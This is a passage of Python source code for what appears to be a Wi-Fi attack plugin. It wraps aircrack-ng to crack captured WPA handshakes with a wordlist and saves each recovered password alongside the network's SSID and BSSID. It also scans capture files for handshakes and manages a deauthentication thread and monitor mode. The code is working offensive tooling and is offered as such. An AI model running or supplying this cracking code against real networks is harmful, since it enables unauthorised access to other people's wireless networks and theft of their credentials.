            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                transient=True
            ) as progress:
                progress.add_task(description="Cracking WPA handshake...", total=None)
                
                rc, stdout, stderr = run_command([
                    "aircrack-ng",
                    "-w", wordlist,
                    file_to_crack
                ])
            
            # Check if password was found
            if "KEY FOUND!" in stdout:
                # Extract the password
                match = re.search(r'KEY FOUND! \[ (.*?) \]', stdout)
                if match:
                    password = match.group(1)
                    self.console.print(f"[green bold]Password found: {password}[/green bold]")
                    
                    # Save the result
                    result_file = file_to_crack.replace('.cap', '_cracked.txt')
                    with open(result_file, 'w') as f:
                        f.write(f"SSID: {self.target_ssid or 'Unknown'}\n")
                        f.write(f"BSSID: {self.target_bssid or 'Unknown'}\n")
                        f.write(f"Password: {password}\n")
                        f.write(f"Capture file: {file_to_crack}\n")
                        f.write(f"Cracked on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    
                    self.console.print(f"[green]Result saved to: {result_file}[/green]")
                    return True
                else:
                    self.console.print("[yellow]Password found but couldn't extract it from output[/yellow]")
                    return False
            else:
                self.console.print("[yellow]Password not found in wordlist[/yellow]")
                return False
            
        except Exception as e:
            self.logger.error(f"Error cracking handshake: {str(e)}")
            self.console.print(f"[red]Error cracking handshake: {str(e)}[/red]")
            return False
    
    def list_captures(self) -> None:
        """List available capture files."""
        try:
            captures = [f for f in os.listdir(self.pcap_dir) if f.endswith('.cap')]
            
            if not captures:
                self.console.print("[yellow]No capture files found[/yellow]")
                return
            
            # Create a formatted table
            table = Table(title="Available Capture Files")
            table.add_column("#", style="dim", width=4)
            table.add_column("Filename", style="cyan")
            table.add_column("Size", style="green")
            table.add_column("Date", style="blue")
            table.add_column("Handshake", style="yellow")
            
            for idx, filename in enumerate(sorted(captures), 1):
                path = os.path.join(self.pcap_dir, filename)
                size = os.path.getsize(path)
                size_str = f"{size / 1024:.1f} KB"
                date = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M:%S')
                
                # Check if file contains a handshake
                has_handshake = "Unknown"
                if check_dependency('aircrack-ng'):
                    rc, stdout, stderr = run_command(["aircrack-ng", path])
                    if "1 handshake" in stdout or "handshake found" in stdout or "handshake detected" in stdout:
                        has_handshake = "[green]Yes[/green]"
                    else:
                        has_handshake = "[red]No[/red]"
                
                table.add_row(
                    str(idx),
                    filename,
                    size_str,
                    date,
                    has_handshake
                )
            
            # Print the table
            self.console.print(table)
            
        except Exception as e:
            self.logger.error(f"Error listing captures: {str(e)}")
            self.console.print(f"[red]Error listing captures: {str(e)}[/red]")
    
    def cleanup(self) -> None:
        """
        Clean up resources before unloading the plugin.
        """
        # Stop monitoring if active
        if self.monitoring:
            self.stop_handshake_capture()
        
        # Stop deauth if active
        if self.deauthing:
            self.deauthing = False
            if self.deauth_thread:
                self.deauth_thread.join(timeout=1.0)
                self.deauth_thread = None
        
        # Disable monitor mode if it was enabled
        if self.original_interface_state:
            self.disable_monitor_mode()
        
        self.logger.info("WPA handshake plugin cleaned up")


# Import EAPOL layer for WPA handshake detection
from scapy.layers.eap import EAPOL

